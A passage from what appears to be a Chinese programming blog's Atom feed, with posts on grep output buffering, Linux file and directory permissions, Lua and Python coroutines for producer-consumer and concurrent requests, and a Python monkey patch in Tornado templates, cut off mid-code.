            &lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;hello,world&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;hello,world&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
            &lt;span class="n"&gt;sleep&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;shell命令也经常会碰到buffer的问题。比如上面的C程序编译后，我用下面的命令运行：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./a.out  |  grep -a 'h'  | grep 'h'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;是没有任何输出的(除非buffer被塞满了)。因为第一个grep的输出被buffer了。给第一个grep带上--line-buffered即可。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./a.out  |  grep -a 'h' --line-buffered | grep 'h'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;关于IO buffer 更多资料可以参考这篇文章: &lt;a href="http://blog.gtwang.org/linux/linux-standard-streams-buffer/"&gt;http://blog.gtwang.org/linux/linux-standard-streams-buffer/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;quoras上的回答：&lt;a href="https://www.quora.com/In-C-what-does-buffering-I-O-or-buffered-I-O-mean"&gt;https://www.quora.com/In-C-what-does-buffering-I-O-or-buffered-I-O-mean&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>Linux文件权限</title><link href="https://lovedboy.github.io/blog/1970/01/01/linuxwen-jian-quan-xian.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/linuxwen-jian-quan-xian.html</id><summary type="html">&lt;h1&gt;Linux的文件权限&lt;/h1&gt;
&lt;h2&gt;文件的权限&lt;/h2&gt;
&lt;p&gt;普通文件的权限很好理解，r表示可读，w表示可写，x表示可执行。&lt;/p&gt;
&lt;h2&gt;目录的权限&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The write bit allows the affected user to create, rename, or delete files within the directory, and modify the directory's attributes&lt;/li&gt;
&lt;li&gt;The read bit allows the affected user to list the files within the directory&lt;/li&gt;
&lt;li&gt;The execute bit allows the affected user to …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;Linux的文件权限&lt;/h1&gt;
&lt;h2&gt;文件的权限&lt;/h2&gt;
&lt;p&gt;普通文件的权限很好理解，r表示可读，w表示可写，x表示可执行。&lt;/p&gt;
&lt;h2&gt;目录的权限&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;The write bit allows the affected user to create, rename, or delete files within the directory, and modify the directory's attributes&lt;/li&gt;
&lt;li&gt;The read bit allows the affected user to list the files within the directory&lt;/li&gt;
&lt;li&gt;The execute bit allows the affected user to enter the directory, and access files and directories inside&lt;/li&gt;
&lt;li&gt;The sticky bit states that files and directories within that directory may only be deleted or renamed by their owner (or root)  &lt;a href="http://unix.stackexchange.com/a/21252"&gt;引用&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;目录的w权限控制用户可以创建、重命名、删除目录里面的文件。&lt;/p&gt;
&lt;p&gt;目录的r权限控制用户可以列出目录的文件列表。(需要配合x权限)  &lt;/p&gt;
&lt;p&gt;目录的x权限控制用户可以进入目录，访问里面的文件和子目录。&lt;/p&gt;
&lt;h2&gt;权限问题&lt;/h2&gt;
&lt;p&gt;进入一个目录(cd)需要的最小权限是x，如果需要查看文件列表(ls)，需要拥有r权限。&lt;/p&gt;
&lt;p&gt;读取文件的最小权限是？比如cat，more等。目录需要x，文件需要r。&lt;/p&gt;
&lt;p&gt;修改文件呢？目录x，文件w。如果你用vi编辑器修改，肯定还需要r。&lt;/p&gt;
&lt;p&gt;创建文件呢？目录wx。&lt;/p&gt;
&lt;p&gt;执行文件呢？目录x，文件x。&lt;/p&gt;
&lt;p&gt;&lt;a href="http://vbird.dic.ksu.edu.tw/linux_basic/0220filemanager_6.php"&gt;参考&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.hackinglinuxexposed.com/articles/20030424.html"&gt;推荐阅读&lt;/a&gt;&lt;/p&gt;</content></entry><entry><title>lua协程</title><link href="https://lovedboy.github.io/blog/1970/01/01/luaxie-cheng.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/luaxie-cheng.html</id><summary type="html">&lt;h3&gt;概念&lt;/h3&gt;
&lt;p&gt;协程并不是Lua独有的东西，很有语言实现了协程，比如Go、Python等。协程是一种类似于线程的东西，我们可以将它理解为用户态的线程，协程的调度是由开发者控制的，一个线程只能同时运行一个协程，非并行执行，线程是由操作系统调度的，如果有多核的话，是可以并行执行的。&lt;/p&gt;
&lt;h3&gt;主要函数&lt;/h3&gt;
&lt;p&gt;Lua协程几个主要函数:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.create&lt;/code&gt; - 创建协程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.status&lt;/code&gt; - 查看协程状态&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.resume&lt;/code&gt; - 执行协程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.yield&lt;/code&gt; - 挂起协程&lt;/p&gt;
&lt;p&gt;有两个需要注意的地方：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;resume 执行完协程函数或者中途被挂起（yield）时，会有返回值返回，第一个值是 true，表示执行没有错误。如果是被 yield 挂起暂停，yield 函数有参数传入的话，这些参数会接着第一个值后面一并返回&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;resume(val...) 如果是开始执行，val1 及之后的值都作为参数传递给协程体函数；如果是恢复执行，val1 及之后的值都作为 …&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h3&gt;概念&lt;/h3&gt;
&lt;p&gt;协程并不是Lua独有的东西，很有语言实现了协程，比如Go、Python等。协程是一种类似于线程的东西，我们可以将它理解为用户态的线程，协程的调度是由开发者控制的，一个线程只能同时运行一个协程，非并行执行，线程是由操作系统调度的，如果有多核的话，是可以并行执行的。&lt;/p&gt;
&lt;h3&gt;主要函数&lt;/h3&gt;
&lt;p&gt;Lua协程几个主要函数:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.create&lt;/code&gt; - 创建协程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.status&lt;/code&gt; - 查看协程状态&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.resume&lt;/code&gt; - 执行协程&lt;/p&gt;
&lt;p&gt;&lt;code&gt;coroutine.yield&lt;/code&gt; - 挂起协程&lt;/p&gt;
&lt;p&gt;有两个需要注意的地方：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;resume 执行完协程函数或者中途被挂起（yield）时，会有返回值返回，第一个值是 true，表示执行没有错误。如果是被 yield 挂起暂停，yield 函数有参数传入的话，这些参数会接着第一个值后面一并返回&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;resume(val...) 如果是开始执行，val1 及之后的值都作为参数传递给协程体函数；如果是恢复执行，val1 及之后的值都作为 yield 的返回值传递。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;看下面的代码:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="err"&gt;/usr/local/bin/lua&lt;/span&gt;

&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;greet&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;coroutine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;yield&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;hello,wrold&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="nx"&gt;end&lt;/span&gt;

&lt;span class="nx"&gt;co&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;coroutine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;greet&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;coroutine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;co&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;step1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;coroutine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;resume&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;co&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;a&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;b&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;coroutine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;co&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;step2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;coroutine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;resume&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;co&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;span class="nx"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;coroutine&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;co&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序输出：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;suspended  
step1  
true    hello,wrold  
suspended  
step2  
true    2.0  
dead
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;生产者和消费者&lt;/h3&gt;
&lt;p&gt;用协程实现一个经典的生产者和消费者：
生产者负责读取输入、消费者打印输出。&lt;/p&gt;
&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#!/usr/local/bin/lua&lt;/span&gt;

&lt;span class="kr"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;producer&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="kr"&gt;return&lt;/span&gt; &lt;span class="nb"&gt;coroutine.create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kr"&gt;function&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="kr"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="kr"&gt;do&lt;/span&gt;
            &lt;span class="kd"&gt;local&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;io.read&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
            &lt;span class="nb"&gt;coroutine.yield&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="kr"&gt;end&lt;/span&gt;
    &lt;span class="kr"&gt;end&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kr"&gt;end&lt;/span&gt;

&lt;span class="kr"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;consumer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="kr"&gt;while&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt; &lt;span class="kr"&gt;do&lt;/span&gt;
        &lt;span class="kd"&gt;local&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;coroutine.resume&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="kr"&gt;if&lt;/span&gt; &lt;span class="n"&gt;status&lt;/span&gt; &lt;span class="kr"&gt;then&lt;/span&gt;
            &lt;span class="nb"&gt;io.write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;INPUT:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="kr"&gt;else&lt;/span&gt;
            &lt;span class="kr"&gt;break&lt;/span&gt;
        &lt;span class="kr"&gt;end&lt;/span&gt;
    &lt;span class="kr"&gt;end&lt;/span&gt;
&lt;span class="kr"&gt;end&lt;/span&gt;

&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;producer&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;consumer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;执行：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;line=1;while true; do echo "hello,world $line";sleep 1;let line=line+1; done| ./producer.lua&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;输出：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;4&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;6&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;7&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;8&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;9&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;11&lt;/span&gt;
&lt;span class="n"&gt;INPUT&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="n"&gt;hello&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="n"&gt;world&lt;/span&gt; &lt;span class="mi"&gt;12&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Python用yield实现协程和Lua很多相似的地方，下面是一个Python的实现：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;producer&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="k"&gt;yield&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;consumer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;INPUT:&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;producer&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;consumer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;相比用两个线程来模拟生产者和消费者是不是简单多了，而且还不用考虑加锁，因为整个流程都是非抢占式的:）&lt;/p&gt;
&lt;h3&gt;并发&lt;/h3&gt;
&lt;p&gt;单线程要实现并发肯定是靠非阻塞或者异步IO了。Linux上的实现有&lt;code&gt;select&lt;/code&gt;、&lt;code&gt;poll&lt;/code&gt;和现在的&lt;code&gt;epoll&lt;/code&gt;。select、poll是轮询机制、epoll是事件通知机制。&lt;/p&gt;
&lt;p&gt;用协程模拟select来实现并发。&lt;/p&gt;
&lt;p&gt;访问 http://httpbin.org/delay/3，这个请求响应时间为3S。&lt;/p&gt;
&lt;p&gt;完整代码见这里&lt;a href="https://gist.github.com/lovedboy/f12c0ddf485eb1a05322"&gt;协程模拟select来实现并发&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;看5次请求所需时间：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;worker0 start....       /delay/3
worker1 start....       /delay/3
worker2 start....       /delay/3
worker3 start....       /delay/3
worker4 start....       /delay/3
worker0 done...
worker1 done...
worker2 done...
worker3 done...
worker4 done...
start at:       21:42:59
end at: 21:43:04
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;花费5s左右。&lt;/p&gt;
&lt;p&gt;30次请求测试：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.....
worker27        done...
worker29        done...
worker28        done...
start at:       21:45:40
end at: 21:45:54
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;花费14s左右。&lt;/p&gt;
&lt;p&gt;&lt;a href="https://gist.github.com/lovedboy/86d7a8b903fb7028a3a9"&gt;Python的实现&lt;/a&gt;。&lt;/p&gt;</content></entry><entry><title>Monkey patch</title><link href="https://lovedboy.github.io/blog/1970/01/01/monkey-patch.html" rel="alternate"></link><published>1970-01-01T00:00:00+08:00</published><updated>1970-01-01T00:00:00+08:00</updated><author><name>lovedb0y</name></author><id>tag:lovedboy.github.io,1970-01-01:/blog/1970/01/01/monkey-patch.html</id><summary type="html">&lt;p&gt;什么是Monkey patch呢？简单理解就是在程序运行时动态修改代码，而不是在磁盘上修改源代码。&lt;/p&gt;
&lt;p&gt;那么Monkey patch有什么作用呢？&lt;a href="https://en.wikipedia.org/wiki/Monkey_patch"&gt;维基&lt;/a&gt;上的解释是:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;＊ Replace methods/attributes/functions at runtime, e.g. to stub out a function &amp;gt;during testing;&lt;/p&gt;
&lt;p&gt;＊ Modify/extend behaviour of a third-party product without maintaining a &amp;gt;private copy of the source code;&lt;/p&gt;
&lt;p&gt;＊ Apply a patch at runtime to the objects in memory, instead …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;什么是Monkey patch呢？简单理解就是在程序运行时动态修改代码，而不是在磁盘上修改源代码。&lt;/p&gt;
&lt;p&gt;那么Monkey patch有什么作用呢？&lt;a href="https://en.wikipedia.org/wiki/Monkey_patch"&gt;维基&lt;/a&gt;上的解释是:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;＊ Replace methods/attributes/functions at runtime, e.g. to stub out a function &amp;gt;during testing;&lt;/p&gt;
&lt;p&gt;＊ Modify/extend behaviour of a third-party product without maintaining a &amp;gt;private copy of the source code;&lt;/p&gt;
&lt;p&gt;＊ Apply a patch at runtime to the objects in memory, instead of the source &amp;gt;code on disk;&lt;/p&gt;
&lt;p&gt;＊ Distribute security or behavioural fixes that live alongside the original &amp;gt;source code (an example of this would be distributing the fix as a plugin &amp;gt;for the Ruby on Rails platform).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Monkey patch的应用场景有哪些？我想到的主要是下面两点：&lt;/p&gt;
&lt;p&gt;1，热升级。比如游戏行业中的不停服升级。    &lt;br&gt;
2，hack第三方库。比如给第三方库打漏洞补丁、自定义功能。&lt;/p&gt;
&lt;p&gt;善于打Monkey patch是Python程序员提高生产力、能力进阶的必备技能之一。&lt;/p&gt;
&lt;p&gt;说一下我用到的一个场景。&lt;/p&gt;
&lt;p&gt;2014-12-08，七牛的域名qiniudn.com被数字拦截。导致装有360的PC都不能访问qiniudn.com上的图片。我司也是受害者。我测试发现七牛默认提供的qbox.me 的域名是没有被拦截的。于是我紧急给tornado的模版函数打了一个Monkey patch，将网页模版里面qiniudn.com全部替换为qbox.me这个域名。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hot_fix_2014_12_08_patch&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;

        &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;tornado.template&lt;/span&gt;  &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;
        &lt;span class="n"&gt;old_generate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Template&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;generate&lt;/span&gt;
        &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;hack_generate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;kwargs&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
